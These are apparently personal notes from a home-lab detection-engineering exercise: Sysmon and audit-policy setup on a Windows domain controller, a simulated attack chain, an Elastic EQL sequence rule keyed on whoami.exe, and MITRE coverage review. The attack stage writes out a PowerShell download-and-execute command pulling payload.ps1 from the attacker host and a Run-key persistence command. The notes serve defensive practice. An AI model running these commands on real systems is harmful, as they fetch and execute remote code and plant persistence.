# Detection Engineering & MITRE Validation — Personal Technical Notes

Date Completed: May 5, 2026
Alert Fired: 7:06 PM EDT

---

## Phase 0: Telemetry Setup — Exact Commands

### Sysmon Installation (Windows Server 2022 DC)

```
sysmon64.exe -accepteula -i sysmonconfig-export.xml
```

Config used: SwiftOnSecurity `sysmonconfig-export.xml`
This config uses `onmatch=exclude` filtering — it suppresses benign high-volume events (ICMP, internal subnet network connections, system process noise) and retains full fidelity on process creation, file writes, registry modifications, and attack-grade network connections.

### Windows Advanced Audit Policy Configuration

Three settings activated — all on the Domain Controller:

**Setting 1 — Force Audit Policy Subcategory:**
```
Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → "Audit: Force audit policy subcategory settings to override audit policy category settings" → Enabled
```

**Setting 2 — Include Command Line in Process Creation:**
```
Computer Configuration → Administrative Templates → System → Audit Process Creation → "Include command line in process creation events" → Enabled
```

**Setting 3 — Advanced Audit Process Creation:**
```
Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Detailed Tracking → "Audit Process Creation" → Success + Failure
```

### Force Group Policy Sync

```
gpupdate /force
```

Required after enabling audit policy changes. Without this, policy changes sit in pending state — Sysmon Event ID 1 logs will show blank `process.command_line` fields until the policy syncs.

### Kali Static IP Assignment (eth1)

```bash
ip addr add 10.0.0.5/24 dev eth1
ip link set eth1 up
```

Verified with:
```bash
ip addr show eth1
```

eth1 static: `10.0.0.5`
VMNet range: `192.168.9.136`
DC IP: `192.168.9.142` (Ethernet1 adapter)

### Telemetry Verification Query (Kibana)

```
winlog.event_id: 1 AND process.command_line: *Phase0*
```

Verification command executed on DC:
```
whoami /priv ; echo "Phase0_CommandLine_Verification_Test"
```

Confirmed: `process.command_line` populated in Elastic with full arguments. Phase 0 gate passed.

### Event ID 3 — Expected Absence

```
winlog.event_id: 3 AND source.ip: "192.168.9.136"
winlog.event_id: 3
```

Both queries returned zero results after confirmed `nc -zv 192.168.9.142 445` TCP handshake. This is correct. SwiftOnSecurity config excludes internal subnet network connections via `onmatch=exclude`. Not a misconfiguration. Event ID 3 fires on external/attack-grade lateral movement, not internal ping traffic.

---

## Phase 1: Attack Simulation — Exact Commands

### Stage 1 — Reconnaissance

```
whoami
```

Executed on the DC. Generates Sysmon Event ID 1 with `process.name: whoami.exe`. This is the first stage trigger for the EQL sequence rule.

### Stage 2 — Payload Staging

File creation activity executed on DC. Generates Sysmon Event ID 11 (File Create). This is the second stage trigger in the EQL sequence rule.

### Stage 3 — PowerShell Download Execution

```powershell
powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')


```

Generates Sysmon Event ID 1 with full command line arguments captured — including the `DownloadString` URL and `IEX` invocation. High-signal TTP.

### Stage 4 — Registry Persistence

```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\Public\payload.exe" /f
```

Generates Sysmon Event ID 13 (Registry Value Set). Captures key path, value name, and data.

---

## MITRE ATT&CK Framework Validation

### Security Onion Navigator Analysis

Validated detection coverage using Security Onion's MITRE ATT&CK Navigator (Screenshot 17). The heatmap visualizes which techniques have active Sigma and Suricata detection rules deployed.

**Coverage Interpretation:**
- Blue tiles = techniques with active detection rules deployed
- Grey/black tiles = detection gaps requiring rule engineering

**Identified Coverage Gaps:**
- Reconnaissance tactic: minimal coverage (Active Scanning, Gather Victim Host Information)
- Resource Development tactic: minimal coverage (Acquire Infrastructure, Compromise Accounts)
- Initial Access tactic: partial coverage gaps

**Strong Coverage Areas:**
- Discovery (34 techniques covered)
- Collection (16 techniques covered)
- Command and Control (18 techniques covered)
- Exfiltration (9 techniques covered)

This validation confirms the organization's detection posture is strongest in post-exploitation phases (Discovery, Collection, C2) and weakest in pre-intrusion phases (Reconnaissance, Resource Development). Future detection engineering priorities should focus on early-stage adversary activity to push detection left in the kill chain.

---

## Troubleshooting Notes — Field Mapping Issues

### Problem: `process.command_line` not populating in Event ID 1 logs

**Root cause:** Windows Advanced Audit Policy change had not been synced via Group Policy. The setting was enabled in the GUI but `gpupdate /force` had not been run. Result: Event ID 1 logs were generating but `process.command_line` was empty — EQL rules targeting command line content returned zero results silently.

**Fix:** `gpupdate /force` on the DC. Verified by rerunning telemetry validation query.

**Lesson:** Policy GUI changes alone are not sufficient. `gpupdate /force` is a hard requirement after any audit policy modification.

---

### Problem: `registry.path` field not reliably indexed for EQL

**Root cause:** `registry.path` is a mapped ECS field pulled from Sysmon Event ID 13 data. In this lab's Elastic index configuration, `registry.path` was not indexed with the consistency required for EQL sequence matching. Queries against `registry.path` in EQL returned no matches even when Event ID 13 logs with registry data were confirmed visible in Discover.

**Impact:** Could not use registry persistence as a sequence trigger in the EQL rule. The four-stage attack chain could not be collapsed into a single EQL rule covering all stages.

**Fix:** Redesigned the detection to target the two most cleanly indexed event types — `process` events (Event ID 1) and `file` events (Event ID 11) — which both carry consistent ECS field mappings in this index. `process.command_line` field availability was confirmed pre-rule-build. `registry.path` was deprioritized.

**Lesson:** Always validate field indexing in the target Elastic index before building EQL rules that reference non-standard or ECS-mapped fields. Run a Discover query first to confirm the field is populated and filterable. EQL returns empty results — not errors — when queried fields are unindexed.

---

## Why the Two-Stage Approach Worked

### What worked: `process` events + `file` events

- **Sysmon Event ID 1** (Process Create) → maps cleanly to `process.name`, `process.command_line`, `host.name` in ECS
- **Sysmon Event ID 11** (File Create) → maps cleanly to `file.name`, `file.path`, `host.name` in ECS

Both event types are fully indexed and EQL-compatible in this environment. The sequence rule operating against these two event types executed cleanly against live telemetry.

### What didn't work: `process.command_line` for registry events, `registry.path`

- `registry.path` from Event ID 13 — not consistently indexed in EQL-accessible fields in this index
- Attempting to build a single multi-step EQL rule spanning process → file → registry returned no results due to field indexing gaps

### The detection logic

```eql
sequence by host.name with maxspan=1h
  [process where event.type == "start" and process.name == "whoami.exe"]
  [file where event.type == "creation"]
```

`whoami.exe` is one of the first executables run in any hands-on-keyboard intrusion. A file creation event immediately following `whoami.exe` on a domain controller is a high-confidence two-event IOC. This sequence fires before PowerShell, before persistence — it intercepts the earliest confirmable attacker action on the endpoint.

---

## EQL Sequence Syntax Breakdown

```eql
sequence by host.name with maxspan=1h
  [process where event.type == "start" and process.name == "whoami.exe"]
  [file where event.type == "creation"]
```

| Component | Function |
|---|---|
| `sequence` | Declares ordered event matching — Stage 1 must occur before Stage 2 |
| `by host.name` | Correlation key — both events must share the same `host.name` value |
| `with maxspan=1h` | Time constraint — Stage 2 must occur within 1 hour of Stage 1 |
| `[process where ...]` | Stage 1 filter — targets process creation events only |
| `event.type == "start"` | Filters to process start events specifically (excludes stop/end events) |
| `process.name == "whoami.exe"` | Identifies the specific binary — case-insensitive in EQL |
| `[file where event.type == "creation"]` | Stage 2 filter — any file creation event on the same host |

---

## host.name Correlation Logic

`sequence by host.name` binds both events to the same endpoint. Without this:

- A `whoami.exe` execution on any host in the environment (legitimate admin activity, scheduled tasks, monitoring agents) would satisfy Stage 1 of the rule
- Any subsequent file creation anywhere on any host would satisfy Stage 2
- Result: high-volume false positives across unrelated endpoints, rule becomes operationally unusable

With `host.name` binding, both events must originate from the same machine. A `whoami.exe` on `WIN-HS48GJMN0GP` must be followed by a file creation on `WIN-HS48GJMN0GP` to fire the alert. Cross-host noise is eliminated at the sequence correlation level.

For production tuning: additional specificity can be added by scoping Stage 2 to specific directories (`file.path` matching staging paths like `C:\Users\Public\`, `C:\Windows\Temp\`) to reduce false positives from routine system file writes following `whoami.exe` execution.

---

## Lessons Learned

**Validate field indexing before rule development, not during.** Both `process.command_line` and `registry.path` field issues were discovered mid-build. Pre-build field validation in Discover eliminates this bottleneck. Standard practice going forward: confirm field is populated, filterable, and indexed in Kibana Discover before writing any EQL referencing it.

**`gpupdate /force` is not optional after audit policy changes.** Policy changes applied via GUI are not active until `gpupdate /force` is run.